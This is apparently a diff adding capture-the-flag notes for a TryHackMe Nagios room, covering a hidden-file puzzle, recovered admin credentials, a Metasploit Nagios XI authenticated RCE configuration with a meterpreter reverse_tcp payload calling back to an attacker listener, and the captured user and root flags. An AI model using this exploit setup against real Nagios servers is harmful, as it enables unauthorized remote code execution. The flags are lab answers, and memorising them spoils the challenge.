@@ -1,0 +1,56 @@
+found interesting dir
+=====================
+/index.php => lead to nagios webpage clicked access redirected to another login page.
+
+Hint for hidden file
+====================
+Ag Hg Ta Sb Po Pd Hg Pt Lr
+
+//it's chemical element, refer to periodic table extract the element no.
+//the element number: 47 80 73 51 84 46 80 78 103 (ASCII Decimal form)
+//converted to text: /PI3T.PNg
+
+//download png file, exiftools to see creator
+//the image is esoteric porgramming language(piet)
+//hint from observing the image, the pixalated box in PI3T.PNg 
+//decode piet (by uploading img) <https://www.bertnase.de/npiet/npiet-execute.php>
+
+credential found in img
+=======================
+nagiosadmin:n3p3UQ&9BjLp4$7uhWdY
+
+//version: nagios xi 5.5.6
+
+msf exploit (exploit/linux/http/nagios_xi_authenticated_rce)
+===========
+   PASSWORD   n3p3UQ&9BjLp4$7uhWdY  yes       Password to authenticate with
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.117.184         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80                    yes       The target port (TCP)
+   SRVHOST    0.0.0.0               yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080                  yes       The local port to listen on.
+   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                     yes       Base path to NagiosXI
+   URIPATH                          no        The URI to use for this exploit (default is random)
+   USERNAME   nagiosadmin           yes       Username to authenticate with
+   VHOST                            no        HTTP server virtual host
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.23.162      yes       The listen address (an interface may be specified)
+   LPORT  18890            yes       The listen port
+
+userFlag
+========
+cat user.txt
+THM{84b17add1d72a9f2e99c33bc568ae0f1}
+
+rootFlag
+========
+cat root.txt
+THM{c89b2e39c83067503a6508b21ed6e962}
+
